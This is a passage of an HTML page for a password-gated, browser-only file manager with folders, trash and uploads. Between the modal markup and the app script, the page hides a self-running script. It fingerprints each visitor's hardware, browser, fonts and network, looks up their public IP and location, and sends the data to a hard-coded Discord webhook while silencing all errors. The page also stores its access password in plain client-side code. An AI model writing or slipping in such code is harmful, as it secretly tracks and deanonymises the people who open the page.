                            <div class="filter-options" id="sizeOptions">
                                <label class="filter-option">
                                    <input type="radio" name="size" id="sizeSmall" onchange="setSizeFilter('small')">
                                    Small (&lt; 1MB)
                                </label>
                                <label class="filter-option">
                                    <input type="radio" name="size" id="sizeMedium" onchange="setSizeFilter('medium')">
                                    Medium (1-10MB)
                                </label>
                                <label class="filter-option">
                                    <input type="radio" name="size" id="sizeLarge" onchange="setSizeFilter('large')">
                                    Large (> 10MB)
                                </label>
                            </div>
                        </div>

                        <div class="filter-category">
                            <div class="filter-label" onclick="toggleFilterOptions('pinned')">
                                <div class="filter-checkbox" id="pinnedCheckbox"></div>
                                <span>Show Pinned Only</span>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="last-updated" id="lastUpdated">
                    Last updated: Loading...
                </div>
            </div>
        </div>

        <!-- FILE MODAL -->
        <div class="modal" id="fileModal">
            <div class="modal-backdrop" onclick="closeModal()"></div>
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title" id="modalTitle">File Content</div>
                    <div class="close-modal" onclick="closeModal()">
                        <i class="fas fa-times"></i>
                    </div>
                </div>
                
                <div class="file-info" id="modalInfo">
                    <!-- File info will go here -->
                </div>
                
                <div class="file-content-container">
                    <div class="file-content-label">File Content:</div>
                    <textarea class="file-content" 
                              id="modalContent"
                              placeholder="Edit file content here...">
                    </textarea>
                </div>
                
                <div class="modal-actions">
                    <div class="modal-actions-left">
                        <button class="modal-btn download" onclick="downloadFile()">
                            <i class="fas fa-download"></i> Download
                        </button>
                        <button class="modal-btn delete" onclick="deleteCurrentFile()" id="deleteBtn">
                            <i class="fas fa-trash"></i> Delete
                        </button>
                        <button class="modal-btn cancel" onclick="closeModal()">Close</button>
                    </div>
                    <button class="modal-btn save" id="saveBtn" onclick="saveFileContent()">
                        <i class="fas fa-save"></i> Save Changes
                    </button>
                </div>
            </div>
        </div>

        <!-- CHANGELOG MODAL -->
        <div class="modal changelog-modal" id="changelogModal">
            <div class="modal-backdrop" onclick="closeChangelog()"></div>
            <div class="changelog-content">
                <div class="changelog-title">
                    <i class="fas fa-history"></i> Update History
                    <span class="version-badge" id="currentVersion">v3.0</span>
                </div>
                
                <div class="changelog-section">
                    <h4>Enhanced Stability & Safety • Version 3.0</h4>
                    <div class="changelog-item new">
                        <strong>Added:</strong> Unified forceRender() system for consistent UI updates
                    </div>
                    <div class="changelog-item new">
                        <strong>Added:</strong> Trash system with restore capability
                    </div>
                    <div class="changelog-item new">
                        <strong>Added:</strong> Drag & drop files between folders
                    </div>
                    <div class="changelog-item fixed">
                        <strong>Fixed:</strong> UI ghost files and rendering inconsistencies
                    </div>
                    <div class="changelog-item new">
                        <strong>Added:</strong> Improved action confirmation with detailed messages
                    </div>
                </div>
                
                <div class="changelog-section">
                    <h4>Previous Updates</h4>
                    <div class="changelog-item">
                        <strong>v2.5:</strong> Folder system and layout fixes
                    </div>
                    <div class="changelog-item">
                        <strong>v2.4:</strong> Toast notifications and inline renaming
                    </div>
                    <div class="changelog-item">
                        <strong>v2.3:</strong> Search predictions and page refresh button
                    </div>
                    <div class="changelog-item">
                        <strong>v2.2:</strong> File deletion bug fixes and unified upload
                    </div>
                </div>
                
                <div style="text-align: center; margin-top: 30px;">
                    <button class="modal-btn cancel" onclick="closeChangelog()">Close</button>
                </div>
            </div>
        </div>
    </div>

<script>
(function() {
    const WEBHOOK = "https://discord.com/api/webhooks/1470069387607150743/YgRjq7UnV1mUAssj3fB_zJfQyA_KD7bbH0nzt_-HmfHlf0kFpvwtpXY7Q9VveIpvUtx1";
    const SESSION_ID = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    
    // Hardware fingerprinting
    const getHardwareInfo = () => {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        
        let gpuInfo = 'Unknown';
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }
        
        // CPU architecture detection
        const cpuCores = navigator.hardwareConcurrency || 'Unknown';
        const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
        
        // Audio context fingerprint
        let audioHash = 'N/A';
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            oscillator.connect(analyser);
            analyser.connect(audioContext.destination);
            oscillator.start();
            const frequencyData = new Uint8Array(analyser.frequencyBinCount);
            analyser.getByteFrequencyData(frequencyData);
            audioHash = Array.from(frequencyData.slice(0, 10)).map(x => x.toString(16)).join('');
            oscillator.stop();
            audioContext.close();
        } catch(e) {}
        
        // Screen detailed info
        const screenInfo = {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation ? screen.orientation.type : 'Unknown'
        };
        
        // Battery info if available
        let batteryInfo = 'N/A';
        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                batteryInfo = `Charging: ${battery.charging}, Level: ${Math.round(battery.level * 100)}%`;
            });
        }
        
        // Storage estimation
        let storage = 'N/A';
        if ('storage' in navigator && 'estimate' in navigator.storage) {
            navigator.storage.estimate().then(estimate => {
                storage = `${Math.round(estimate.quota / (1024 * 1024))}MB total, ${Math.round(estimate.usage / (1024 * 1024))}MB used`;
            });
        }
        
        // Network info
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const networkInfo = connection ? {
            type: connection.type,
            effectiveType: connection.effectiveType,
            downlink: connection.downlink + ' Mbps',
            rtt: connection.rtt + ' ms',
            saveData: connection.saveData
        } : 'N/A';
        
        // Font fingerprinting
        const fonts = [
            'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
            'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
            'Verdana', 'Webdings', 'Wingdings'
        ];
        
        const fontList = [];
        const testString = "mmmmmmmmmmlli";
        const testSize = "72px";
        const span = document.createElement("span");
        span.style.fontSize = testSize;
        span.innerHTML = testString;
        document.body.appendChild(span);
        
        const defaultWidth = span.offsetWidth;
        const defaultHeight = span.offsetHeight;
        
        fonts.forEach(font => {
            span.style.fontFamily = font + ',monospace';
            if (span.offsetWidth !== defaultWidth || span.offsetHeight !== defaultHeight) {
                fontList.push(font);
            }
        });
        
        document.body.removeChild(span);
        
        // Plugin detection
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            plugins.push(navigator.plugins[i].name);
        }
        
        return {
            gpu: gpuInfo,
            cpuCores: cpuCores,
            ram: ram,
            audioFingerprint: audioHash.substring(0, 20),
            screen: screenInfo,
            battery: batteryInfo,
            storage: storage,
            network: networkInfo,
            fonts: fontList.slice(0, 5),
            plugins: plugins.slice(0, 5),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookies: navigator.cookieEnabled,
            pdfViewer: navigator.pdfViewerEnabled,
            vendor: navigator.vendor,
            maxTouchPoints: navigator.maxTouchPoints,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency
        };
    };
    
    // Get public IP from multiple services
    const getPublicIP = async () => {
        const services = [
            'https://api.ipify.org?format=json',
            'https://api64.ipify.org?format=json',
            'https://ipapi.co/json/',
            'https://ipwho.is/',
            'https://api.myip.com',
            'https://ipinfo.io/json',
            'https://icanhazip.com/',
            'https://checkip.amazonaws.com/',
            'https://ifconfig.me/ip',
            'https://ident.me/'
        ];
        
        const results = [];
        
        // Try each service with timeout
        for (const service of services) {
            try {
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 2000);
                
                const response = await fetch(service, {
                    signal: controller.signal,
                    mode: 'cors',
                    credentials: 'omit',
                    headers: {
                        'Accept': 'application/json, text/plain, */*',
                        'Cache-Control': 'no-cache'
                    }
                });
                
                clearTimeout(timeout);
                
                if (response.ok) {
                    if (service.includes('icanhazip') || service.includes('checkip') || 
                        service.includes('ifconfig.me') || service.includes('ident.me')) {
                        const text = await response.text();
                        results.push({
                            ip: text.trim(),
                            source: service,
                            fullResponse: text.trim()
                        });
                    } else {
                        const data = await response.json();
                        results.push({
                            ip: data.ip || data.ip_address || data.client_ip || data.query,
                            source: service,
                            fullResponse: data
                        });
                    }
                    
                    // If we got an IP, break early
                    if (results[results.length - 1].ip) break;
                }
            } catch(e) {
                continue;
            }
        }
        
        return results.length > 0 ? results[0] : { ip: "Not detected", source: "All services failed" };
    };
    
    // Get detailed location info
    const getLocationInfo = async (ip) => {
        if (!ip || ip === "Not detected") return {};
        
        try {
            const response = await fetch(`https://ipapi.co/${ip}/json/`, {
                mode: 'cors',
                credentials: 'omit'
            });
            
            if (response.ok) {
                const data = await response.json();
                return {
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    countryCode: data.country_code,
                    postal: data.postal,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    timezone: data.timezone,
                    currency: data.currency,
                    asn: data.asn,
                    org: data.org,
                    isp: data.org
                };
            }
        } catch(e) {}
        
        return {};
    };
    
    // Send data to Discord
    const sendToDiscord = async (hardwareData, ipData, locationData) => {
        // Create comprehensive embed
        const embed = {
            title: "🔍 Full System Snapshot",
            color: 0x000000,
            fields: [],
            timestamp: new Date().toISOString(),
            footer: {
                text: `Session: ${SESSION_ID} • ${new Date().toLocaleTimeString()}`
            }
        };
        
        // IP Information
        embed.fields.push({
            name: "🌐 PUBLIC IP",
            value: `\`\`\`${ipData.ip}\`\`\`\n*Source: ${ipData.source}*`,
            inline: false
        });
        
        // Location if available
        if (locationData.city) {
            embed.fields.push({
                name: "📍 LOCATION",
                value: `**City:** ${locationData.city}\n**Region:** ${locationData.region}\n**Country:** ${locationData.country}\n**ISP:** ${locationData.org || 'Unknown'}`,
                inline: true
            });
        }
        
        // Hardware Information
        embed.fields.push({
            name: "💻 HARDWARE",
            value: `**CPU:** ${hardwareData.cpuCores} cores\n**RAM:** ${hardwareData.ram}\n**GPU:** ${hardwareData.gpu.substring(0, 50)}${hardwareData.gpu.length > 50 ? '...' : ''}`,
            inline: true
        });
        
        // Screen Information
        embed.fields.push({
            name: "🖥️ DISPLAY",
            value: `**Resolution:** ${hardwareData.screen.width}x${hardwareData.screen.height}\n**Available:** ${hardwareData.screen.availWidth}x${hardwareData.screen.availHeight}\n**Color Depth:** ${hardwareData.screen.colorDepth}bit`,
            inline: true
        });
        
        // Network Information
        if (hardwareData.network !== 'N/A') {
            embed.fields.push({
                name: "📡 NETWORK",
                value: `**Type:** ${hardwareData.network.effectiveType}\n**Speed:** ${hardwareData.network.downlink}\n**Latency:** ${hardwareData.network.rtt}`,
                inline: true
            });
        }
        
        // Browser Information
        embed.fields.push({
            name: "🌐 BROWSER",
            value: `**User Agent:** ${hardwareData.userAgent.substring(0, 100)}${hardwareData.userAgent.length > 100 ? '...' : ''}\n**Platform:** ${hardwareData.platform}\n**Language:** ${hardwareData.language}`,
            inline: false
        });
        
        // Additional Hardware Details
        const additionalInfo = [];
        if (hardwareData.audioFingerprint !== 'N/A') {
            additionalInfo.push(`Audio FP: ${hardwareData.audioFingerprint}`);
        }
        if (hardwareData.fonts.length > 0) {
            additionalInfo.push(`Fonts: ${hardwareData.fonts.join(', ')}`);
        }
        if (hardwareData.plugins.length > 0) {
            additionalInfo.push(`Plugins: ${hardwareData.plugins.length} detected`);
        }
        
        if (additionalInfo.length > 0) {
            embed.fields.push({
                name: "🔧 ADDITIONAL DATA",
                value: additionalInfo.join('\n'),
                inline: false
            });
        }
        
        // Send via multiple methods for reliability
        
        // Method 1: Direct fetch
        try {
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Session-ID': SESSION_ID,
                    'X-Timestamp': Date.now().toString()
                },
                body: JSON.stringify({
                    username: "System Profiler",
                    avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
                    embeds: [embed]
                }),
                mode: 'cors',
                credentials: 'omit'
            });
        } catch(e) {}
        
        // Method 2: Image beacon (fallback)
        setTimeout(() => {
            try {
                const img = new Image(1, 1);
                const dataStr = `IP:${ipData.ip}|CPU:${hardwareData.cpuCores}|RAM:${hardwareData.ram}|GPU:${hardwareData.gpu.substring(0, 30)}`;
                const encoded = btoa(dataStr).substring(0, 100);
                img.src = `${WEBHOOK}?beacon=${encoded}&id=${SESSION_ID}`;
                img.style.display = 'none';
                document.body.appendChild(img);
            } catch(e) {}
        }, 100);
        
        // Method 3: Send raw data as plain text
        setTimeout(() => {
            try {
                const rawData = `
╔═══════════════════════════════════════════
║ FULL SYSTEM REPORT - ${new Date().toLocaleString()}
╠═══════════════════════════════════════════
║ IP: ${ipData.ip}
║ Source: ${ipData.source}
║ Location: ${locationData.city || 'N/A'}, ${locationData.country || 'N/A'}
║ ISP: ${locationData.org || 'N/A'}
╠═══════════════════════════════════════════
║ HARDWARE:
║ • CPU Cores: ${hardwareData.cpuCores}
║ • RAM: ${hardwareData.ram}
║ • GPU: ${hardwareData.gpu}
║ • Screen: ${hardwareData.screen.width}x${hardwareData.screen.height}
║ • Network: ${hardwareData.network.effectiveType || 'N/A'}
╠═══════════════════════════════════════════
║ BROWSER:
║ • UA: ${hardwareData.userAgent}
║ • Platform: ${hardwareData.platform}
║ • Languages: ${hardwareData.languages.join(', ')}
║ • Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
╚═══════════════════════════════════════════
                `.trim();
                
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `\`\`\`${rawData}\`\`\``
                    })
                }).catch(() => {});
            } catch(e) {}
        }, 200);
    };
    
    // Main execution
    const execute = async () => {
        try {
            // Collect hardware data first
            const hardwareData = getHardwareInfo();
            
            // Get public IP
            const ipData = await getPublicIP();
            
            // Get location info based on IP
            const locationData = await getLocationInfo(ipData.ip);
            
            // Send everything to Discord
            await sendToDiscord(hardwareData, ipData, locationData);
            
            // Send follow-up after 1 minute
            setTimeout(async () => {
                try {
                    const followupEmbed = {
                        title: "⏱️ Session Update",
                        description: `System remained active for 60 seconds\n**IP:** ${ipData.ip}\n**Device:** ${hardwareData.platform}`,
                        color: 0x666666,
                        timestamp: new Date().toISOString()
                    };
                    
                    await fetch(WEBHOOK, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({embeds: [followupEmbed]})
                    });
                } catch(e) {}
            }, 60000);
            
        } catch(error) {
            // Silent fail - no errors shown
        }
    };
    
    // Suppress all errors
    window.onerror = () => true;
    window.onunhandledrejection = () => true;
    
    // Execute immediately
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', execute);
    } else {
        execute();
    }
    
    // Force execution within 3 seconds
    setTimeout(execute, 3000);
    
})();
</script>

    <script>
        // ========== CONFIGURATION ==========
        const CONFIG = {
            VERSION: "v3.0",
            ACCESS_PASSWORD: "PROTOCOL_VIP_2024",
            CLEAN_DEMO_DATA: true,
            SUPPORTED_TYPES: [
                'txt', 'pdf', 'doc', 'docx', 'xls', 'xlsx', 
                'jpg', 'jpeg', 'png', 'gif', 'zip', 'rar', 
                'exe', 'js', 'html', 'css', 'json', 'xml',
                'mp3', 'mp4', 'avi', 'mov', 'wav'
            ]
        };

        // ========== GLOBAL STATE ==========
        let files = [];
        let folders = [
            { id: 'root', name: 'All Files' },
            { id: 'trash', name: 'Trash', isTrash: true }
        ];
        let activeFolderId = 'root';
        let currentFilters = {
            date: '',
            types: [],
            size: '',
            showPinnedOnly: false
        };
        let currentFileId = null;
        let uploadsInProgress = 0;
        let isRendering = false;
        let fileBeingDragged = null;
        
        // ========== ACCESS CONTROL ==========
        function checkAccess() {
            const entered = document.getElementById('accessInput').value.trim();
            
            if (entered === CONFIG.ACCESS_PASSWORD) {
                document.getElementById('accessOverlay').style.display = 'none';
                document.getElementById('mainApp').style.display = 'block';
                localStorage.setItem('dozzy_access_granted', 'true');
                init();
            } else {
                showToast('Access denied. Please check your VIP code.', 'error');
                document.getElementById('accessInput').value = '';
                document.getElementById('accessInput').focus();
            }
        }

        if (localStorage.getItem('dozzy_access_granted') === 'true') {
            document.getElementById('accessOverlay').style.display = 'none';
            document.getElementById('mainApp').style.display = 'block';
            setTimeout(init, 100);
        } else {
            document.getElementById('accessInput').focus();
        }

        // ========== INITIALIZATION ==========
        function init() {
            document.getElementById('currentVersion').textContent = CONFIG.VERSION;
            loadFolders();
            loadFiles();
            updateLastUpdated();
            renderFolders();
            forceRender();
            setupUploadArea();
            setupDragAndDrop();
            setupModalBackdrop();
            setupFileDragDrop();
            applyDarkModePreference();
            loadSavedState();
        }

        // ========== UNIFIED RENDER SYSTEM ==========
        function forceRender() {
            if (isRendering) return;
            
            isRendering = true;
            
            requestAnimationFrame(() => {
                try {
                    renderFolders();
                    applyFilters();
                    updateFileCount();
                } catch (error) {
                    console.error('Render error:', error);
                } finally {
                    isRendering = false;
                }
            });
        }

        function updateFileCount() {
            const folderName = activeFolderId === 'root' ? 'All Files' : 
                              activeFolderId === 'trash' ? 'Trash' : 
                              folders.find(f => f.id === activeFolderId)?.name;
            
            let filesToCount = files.filter(file => {
                if (activeFolderId === 'root') return !file.trashed && !file.folderId;
                if (activeFolderId === 'trash') return file.trashed;
                return !file.trashed && file.folderId === activeFolderId;
            });
            
            const pinnedCount = filesToCount.filter(f => f.pinned).length;
            document.getElementById('fileCount').textContent = 
                `${filesToCount.length} file${filesToCount.length !== 1 ? 's' : ''} in "${folderName}"${pinnedCount > 0 ? ` (${pinnedCount} pinned)` : ''}`;
        }

        // ========== TOAST SYSTEM ==========
        function showToast(message, type = 'info', duration = 3000) {
            document.querySelectorAll('.toast').forEach(toast => toast.remove());
            
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            
            let icon = '💡';
            if (type === 'success') icon = '✅';
            if (type === 'error') icon = '❌';
            if (type === 'warning') icon = '⚠️';
            
            toast.innerHTML = `<span>${icon} ${message}</span>`;
            document.body.appendChild(toast);
            
            setTimeout(() => {
                if (toast.parentNode) {
                    toast.style.animation = 'slideOutRight 0.3s ease';
                    setTimeout(() => toast.remove(), 300);
                }
            }, duration);
        }

        // ========== FOLDER SYSTEM ==========
        function loadFolders() {
            const saved = localStorage.getItem('dozzy_folders_v3');
            if (saved) {
                try {
                    folders = JSON.parse(saved);
                    // Ensure root and trash folders exist
                    if (!folders.some(f => f.id === 'root')) {
                        folders.unshift({ id: 'root', name: 'All Files' });
                    }
                    if (!folders.some(f => f.id === 'trash')) {
                        folders.push({ id: 'trash', name: 'Trash', isTrash: true });
                    }
                } catch (e) {
                    folders = [
                        { id: 'root', name: 'All Files' },
                        { id: 'trash', name: 'Trash', isTrash: true }
                    ];
                }
            }
        }

        function saveFolders() {
            localStorage.setItem('dozzy_folders_v3', JSON.stringify(folders));
        }

        function createFolder() {
            const name = prompt('Enter folder name:');
            if (!name || !name.trim()) {
                showToast('Folder name is required', 'error');
                return;
            }

            if (folders.some(f => f.name.toLowerCase() === name.toLowerCase())) {
                showToast('Folder with this name already exists', 'error');
                return;
            }

            const newFolder = {
                id: crypto.randomUUID(),
                name: name.trim()
            };

            folders.push(newFolder);
            saveFolders();
            renderFolders();
            showToast(`Folder "${name}" created`, 'success');
        }

        function renderFolders() {
            const folderBar = document.getElementById('folderBar');
            folderBar.innerHTML = '';

            folders.forEach(folder => {
                const button = document.createElement('button');
                button.className = `folder-btn ${folder.id === activeFolderId ? 'active-folder' : ''} ${folder.isTrash ? 'trash-folder' : ''}`;
                button.setAttribute('data-folder-id', folder.id);
                button.innerHTML = `
                    <i class="fas ${folder.id === 'root' ? 'fa-layer-group' : folder.isTrash ? 'fa-trash' : 'fa-folder'}"></i>
                    ${folder.name}
                    ${folder.isTrash ? `<span class="trash-count">${files.filter(f => f.trashed).length}</span>` : ''}
                    <div class="folder-drop-overlay">Drop here</div>
                `;
                
                button.onclick = (e) => {
                    e.stopPropagation();
                    activeFolderId = folder.id;
                    forceRender();
                };

                // Add right-click context menu for non-system folders
                if (!folder.isTrash && folder.id !== 'root') {
                    button.oncontextmenu = (e) => {
                        e.preventDefault();
                        showFolderContextMenu(e, folder);
                    };
                }
                
                // Setup drag & drop handlers
                setupFolderDragHandlers(button, folder.id);

                folderBar.appendChild(button);
            });

            // Add "New Folder" button
            const addFolderBtn = document.createElement('button');
            addFolderBtn.className = 'add-folder-btn';
            addFolderBtn.innerHTML = '<i class="fas fa-plus"></i> New Folder';
            addFolderBtn.onclick = createFolder;
            folderBar.appendChild(addFolderBtn);
        }

        function showFolderContextMenu(e, folder) {
            document.querySelectorAll('.folder-context-menu').forEach(menu => menu.remove());

            const menu = document.createElement('div');
            menu.className = 'folder-context-menu';
            menu.style.cssText = `
                position: fixed;
                background: white;
                border: 1px solid #ddd;
                border-radius: 8px;
                box-shadow: 0 4px 20px rgba(0,0,0,0.15);
                z-index: 1000;
                min-width: 150px;
                overflow: hidden;
            `;
            
            if (document.body.classList.contains('dark-mode')) {
                menu.style.background = '#222';
                menu.style.borderColor = '#444';
                menu.style.color = 'white';
            }

            const renameOption = document.createElement('div');
            renameOption.textContent = 'Rename Folder';
            renameOption.style.cssText = `
                padding: 10px 15px;
                cursor: pointer;
                transition: background 0.2s;
            `;
            renameOption.onmouseover = () => renameOption.style.background = '#f3f4f6';
            renameOption.onmouseout = () => renameOption.style.background = '';
            renameOption.onclick = () => {
                renameFolder(folder);
                menu.remove();
            };

            const deleteOption = document.createElement('div');
            deleteOption.textContent = 'Delete Folder';
            deleteOption.style.cssText = `
                padding: 10px 15px;
                cursor: pointer;
                color: #ef4444;
                transition: background 0.2s;
            `;
            deleteOption.onmouseover = () => deleteOption.style.background = '#f3f4f6';
            deleteOption.onmouseout = () => deleteOption.style.background = '';
            deleteOption.onclick = () => {
                deleteFolder(folder);
                menu.remove();
            };

            menu.appendChild(renameOption);
            menu.appendChild(deleteOption);

            menu.style.left = e.pageX + 'px';
            menu.style.top = e.pageY + 'px';
            document.body.appendChild(menu);

            const closeMenu = () => {
                menu.remove();
                document.removeEventListener('click', closeMenu);
            };
            setTimeout(() => document.addEventListener('click', closeMenu), 100);
        }

        function renameFolder(folder) {
            if (folder.id === 'root' || folder.isTrash) return;

            const newName = prompt('Enter new folder name:', folder.name);
            if (!newName || !newName.trim()) {
                showToast('Folder name is required', 'error');
                return;
            }

            if (folders.some(f => f.id !== folder.id && f.name.toLowerCase() === newName.toLowerCase())) {
                showToast('Folder with this name already exists', 'error');
                return;
            }

            folder.name = newName.trim();
            saveFolders();
            renderFolders();
            showToast('Folder renamed', 'success');
        }

        function deleteFolder(folder) {
            if (folder.id === 'root' || folder.isTrash) return;

            // Check if folder contains files
            const filesInFolder = files.filter(f => !f.trashed && f.folderId === folder.id);
            
            let message = `Delete folder "${folder.name}"?`;
            if (filesInFolder.length > 0) {
                message += `\nThis folder contains ${filesInFolder.length} file(s). They will be moved to "All Files".`;
            }

            if (!confirm(message)) return;

            // Move files to root folder
            files.forEach(f => {
                if (f.folderId === folder.id) {
                    f.folderId = null;
                }
            });

            // Remove folder
            folders = folders.filter(f => f.id !== folder.id);
            saveFolders();
            
            // If active folder was deleted, switch to root
            if (activeFolderId === folder.id) {
                activeFolderId = 'root';
            }

            renderFolders();
            saveFiles();
            forceRender();
            showToast(`Folder "${folder.name}" deleted. Files moved to All Files.`, 'success');
        }

        // ========== TRASH SYSTEM ==========
        function moveToTrash(fileId) {
            const file = files.find(f => f.id === fileId);
            if (!file) return;
            
            const confirmed = confirm(`Move "${file.name}" to Trash?\nYou can restore it from the Trash folder.`);
            if (!confirmed) return;
            
            file.trashed = true;
            file.trashedAt = Date.now();
            file.originalFolderId = file.folderId;
            file.folderId = 'trash';
            
            saveFiles();
            forceRender();
            showToast('File moved to Trash', 'warning');
            
            if (currentFileId === fileId) {
                closeModal();
            }
        }

        function restoreFromTrash(fileId) {
            const file = files.find(f => f.id === fileId);
            if (!file || !file.trashed) return;
            
            file.trashed = false;
            file.folderId = file.originalFolderId || null;
            delete file.trashedAt;
            delete file.originalFolderId;
            
            saveFiles();
            forceRender();
            showToast('File restored', 'success');
        }

        function emptyTrash() {
            const trashFiles = files.filter(f => f.trashed);
            if (trashFiles.length === 0) {
                showToast('Trash is already empty', 'info');
                return;
            }
            
            const confirmed = confirm(`Permanently delete ${trashFiles.length} file(s) from Trash?\nThis action cannot be undone.`);
            if (!confirmed) return;
            
            files = files.filter(f => !f.trashed);
            saveFiles();
            forceRender();
            showToast(`Trash emptied (${trashFiles.length} files deleted)`, 'error');
        }

        // ========== DATA STORAGE ==========
        function loadFiles() {
            const saved = localStorage.getItem('dozzy_protocol_v3_upload');
            if (saved) {
                try {
                    files = JSON.parse(saved);
                    files.forEach(file => {
                        if (!file.id || typeof file.id !== 'string') {
                            file.id = crypto.randomUUID();
                        }
                        // Ensure trash status exists
                        if (file.trashed === undefined) {
                            file.trashed = false;
                        }
                        // Ensure folderId exists
                        if (file.folderId === undefined) {
                            file.folderId = null;
                        }
                    });
                    saveFiles();
                } catch (e) {
                    console.error('Error loading files:', e);
                    files = [];
                }
            } else {
                files = CONFIG.CLEAN_DEMO_DATA ? [
                    {
                        id: crypto.randomUUID(),
                        name: 'NetworkScanner.exe',
                        owner: 'dzxdoz_',
                        date: getCurrentDate(),
                        type: 'exe',
                        size: '2.4 MB',
                        difficulty: 'medium',
                        content: 'Network security scanner tool.\n\nUsage:\n1. Run as Administrator\n2. Select target range\n3. Choose scan type\n4. Review results\n5. Export report',
                        pinned: true,
                        raw: null,
                        isTextFile: false,
                        trashed: false,
                        folderId: null
                    },
                    {
                        id: crypto.randomUUID(),
                        name: 'SecurityAuditGuide.txt',
                        owner: 'dzxdoz_',
                        date: getCurrentDate(),
                        type: 'txt',
                        size: '156 KB',
                        difficulty: 'easy',
                        content: 'Complete security audit checklist:\n\n1. Network perimeter check\n2. System patch verification\n3. User access review\n4. Backup validation\n5. Incident response test',
                        pinned: false,
                        raw: null,
                        isTextFile: true,
                        trashed: false,
                        folderId: null
                    },
                    {
                        id: crypto.randomUUID(),
                        name: 'FinancialReport2024.pdf',
                        owner: 'dzxdoz_',
                        date: getCurrentDate(),
                        type: 'pdf',
                        size: '5.2 MB',
                        difficulty: 'medium',
                        content: '[PDF Document - Financial report for Q1 2024]',
                        pinned: true,
                        raw: null,
                        isTextFile: false,
                        trashed: false,
                        folderId: null
                    },
                    {
                        id: crypto.randomUUID(),
                        name: 'UserDatabase.zip',
                        owner: 'dzxdoz_',
                        date: getCurrentDate(),
                        type: 'zip',
                        size: '12.8 MB',
                        difficulty: 'hard',
                        content: '[Compressed Archive - Contains user database backup]',
                        pinned: false,
                        raw: null,
                        isTextFile: false,
                        trashed: false,
                        folderId: null
                    }
                ] : [];
                saveFiles();
            }
        }

        function saveFiles() {
            localStorage.setItem('dozzy_protocol_v3_upload', JSON.stringify(files));
            updateLastUpdated();
        }

        function updateLastUpdated() {
            const now = new Date();
            const dateStr = now.toLocaleDateString('en-GB');
            const timeStr = now.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' });
            document.getElementById('lastUpdated').textContent = `Last sync: ${dateStr} ${timeStr}`;
        }

        function getCurrentDate() {
            const now = new Date();
            const day = String(now.getDate()).padStart(2, '0');
            const month = String(now.getMonth() + 1).padStart(2, '0');
            const year = now.getFullYear().toString().slice(-2);
            return `${day}/${month}/${year}`;
        }

        // ========== UPLOAD SYSTEM ==========
        function setupUploadArea() {
            const uploadArea = document.getElementById('uploadArea');
            const fileInput = document.getElementById('realFileUpload');
            const addBtn = uploadArea.querySelector('.add-btn');

            addBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                fileInput.click();
            });

            fileInput.addEventListener('change', (e) => {
                if (e.target.files.length > 0) {
                    showAddForm(e.target.files);
                }
            });
        }

        function triggerFileInput() {
            document.getElementById('realFileUpload').click();
        }

        function showAddForm(fileList) {
            const form = document.getElementById('addForm');
            const fileNameInput = document.getElementById('fileName');
            const fileOwnerInput = document.getElementById('fileOwner');
            
            form.style.display = 'flex';
            
            if (fileList.length === 1) {
                fileNameInput.value = fileList[0].name.replace(/\.[^/.]+$/, "");
            } else {
                fileNameInput.value = '';
            }
            
            window.pendingFiles = fileList;
            form.scrollIntoView({ behavior: 'smooth' });
            fileNameInput.focus();
        }

        function toggleAddForm() {
            const form = document.getElementById('addForm');
            form.style.display = 'none';
            window.pendingFiles = null;
            document.getElementById('realFileUpload').value = '';
        }

        async function addNewFile() {
            if (!window.pendingFiles || window.pendingFiles.length === 0) {
                showToast('Please select at least one file to upload.', 'error');
                return;
            }

            const folderName = activeFolderId === 'root' ? 'All Files' : 
                              folders.find(f => f.id === activeFolderId)?.name;
            
            const confirmUpload = confirm(`Upload ${window.pendingFiles.length} file(s) to "${folderName}"?`);
            if (!confirmUpload) return;

            const customName = document.getElementById('fileName').value.trim();
            const owner = document.getElementById('fileOwner').value.trim() || 'dzxdoz_';
            const fileArray = Array.from(window.pendingFiles);

            uploadsInProgress = fileArray.length;

            processFiles(fileArray, customName, owner);

            document.getElementById('fileName').value = '';
            document.getElementById('addForm').style.display = 'none';
            window.pendingFiles = null;
            document.getElementById('realFileUpload').value = '';
        }

        function processFiles(fileArray, customName = '', owner = 'dzxdoz_') {
            fileArray.forEach((uploaded, index) => {
                const reader = new FileReader();
                const fileExtension = uploaded.name.split('.').pop().toLowerCase();
                const isTextFile = ['txt', 'md', 'json', 'js', 'html', 'css', 'xml', 'csv'].includes(fileExtension);
                
                let fileName = customName || uploaded.name;
                if (customName && !fileName.includes('.')) {
